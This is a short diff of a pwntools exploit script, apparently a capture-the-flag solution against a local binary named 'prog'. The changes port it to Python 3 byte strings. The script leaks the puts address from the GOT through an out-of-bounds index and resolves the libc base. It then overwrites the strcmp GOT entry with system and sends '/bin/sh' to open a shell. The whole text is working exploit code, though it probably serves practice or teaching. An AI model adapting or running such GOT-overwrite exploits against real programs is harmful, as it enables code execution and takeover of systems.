@@ -2,8 +2,8 @@ from pwn import *
 
 ref = 'puts'
 
-e = ELF('prog')
-context.clear(arch=e.arch, endian=e.endian)
+context.binary = 'prog'
+e = context.binary
 
 n1 = (e.got[ref] - e.sym.ans) // context.bytes + 4
 n2 = (e.got.strcmp - e.sym.ans) // context.bytes + 4
@@ -12,13 +12,13 @@ l = e.libc
 p = e.process()
 p.clean()
 
-p.sendline(str(n1))
+p.sendline(str(n1).encode('ascii'))
 addr = int(p.readline())
 l.address += addr - l.sym[ref]
 
-p.sendline(str(n2))
-p.sendline(str(l.sym.system))
+p.sendline(str(n2).encode('ascii'))
+p.sendline(str(l.sym.system).encode('ascii'))
 
-p.sendline('/bin/sh\x00')
+p.sendline(b'/bin/sh\x00')
 
 p.interactive()
